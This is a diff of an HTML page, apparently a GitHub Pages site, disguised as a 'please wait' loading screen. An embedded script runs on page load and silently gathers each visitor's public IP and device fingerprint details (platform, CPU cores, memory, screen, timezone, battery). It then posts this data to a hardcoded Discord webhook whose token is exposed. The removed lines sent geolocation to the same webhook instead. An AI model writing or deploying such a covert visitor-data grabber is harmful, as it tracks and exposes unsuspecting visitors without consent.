@@ -1,48 +1,62 @@
 "Dance till your dead!"
 <h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>
-Waiting for response
+Waiting for response.....
 <script>
 window.addEventListener("load", async () => {
   const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
 
-  function logMessage(message, color = "black") {
-    const pre = document.createElement("pre");
-    pre.style.color = color;
-    pre.style.background = "#f0f0f0";
-    pre.style.padding = "5px";
-    pre.textContent = message;
-    document.body.appendChild(pre);
+  function log(msg, color="black") {
+    const p = document.createElement("pre");
+    p.style.color = color;
+    p.textContent = msg;
+    document.body.appendChild(p);
   }
 
   try {
-    logMessage("Fetching IP info...", "blue");
+    log("Getting public IP...", "blue");
 
-    // Use a free CORS proxy
-    const proxy = "https://api.allorigins.win/get?url=";
-    const target = encodeURIComponent("https://ipapi.co/json/");
-    const res = await fetch(proxy + target);
-    if (!res.ok) throw new Error(`Proxy request failed: ${res.status}`);
+    const ipRes = await fetch("https://api64.ipify.org?format=json");
+    const ipData = await ipRes.json();
 
-    const wrapped = await res.json();
-    const data = JSON.parse(wrapped.contents);
+    log("IP received: " + ipData.ip, "green");
 
-    logMessage("IP info fetched successfully ✅", "green");
+    // Device Info
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cores: navigator.hardwareConcurrency || "Unknown",
+      memory: navigator.deviceMemory || "Unknown",
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      online: navigator.onLine
+    };
+
+    // Battery (may not work on iOS)
+    let batteryInfo = "Not supported";
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryInfo =
+        `Level: ${Math.round(battery.level * 100)}% | ` +
+        `Charging: ${battery.charging}`;
+    }
+
+    log("Sending to webhook...", "blue");
 
     const payload = {
       content:
         `🌍 Visit Detected\n\n` +
-        `IP: ${data.ip}\n` +
-        `City: ${data.city}\n` +
-        `Region: ${data.region}\n` +
-        `Country: ${data.country_name}\n` +
-        `ISP: ${data.org}\n` +
-        `Timezone: ${data.timezone}\n` +
-        `Latitude: ${data.latitude}\n` +
-        `Longitude: ${data.longitude}\n` +
-        `Page: ${window.location.href}`
+        `IP: ${ipData.ip}\n` +
+        `Platform: ${deviceInfo.platform}\n` +
+        `Language: ${deviceInfo.language}\n` +
+        `CPU Cores: ${deviceInfo.cores}\n` +
+        `RAM (approx): ${deviceInfo.memory} GB\n` +
+        `Screen: ${deviceInfo.screen}\n` +
+        `Timezone: ${deviceInfo.timezone}\n` +
+        `Online: ${deviceInfo.online}\n` +
+        `Battery: ${batteryInfo}\n\n` +
+        `UserAgent:\n${deviceInfo.userAgent}`
     };
-
-    logMessage("Sending to webhook...", "blue");
 
     await fetch(webhookURL, {
       method: "POST",
@@ -51,10 +65,10 @@ window.addEventListener("load", async () => {
       body: JSON.stringify(payload)
     });
 
-    logMessage("✅ Sent to webhook!", "green");
+    log("✅ Sent to webhook!", "green");
 
   } catch (err) {
-    logMessage(`❌ Error: ${err.message}`, "red");
+    log("❌ Error: " + err.message, "red");
   }
 });
 </script>
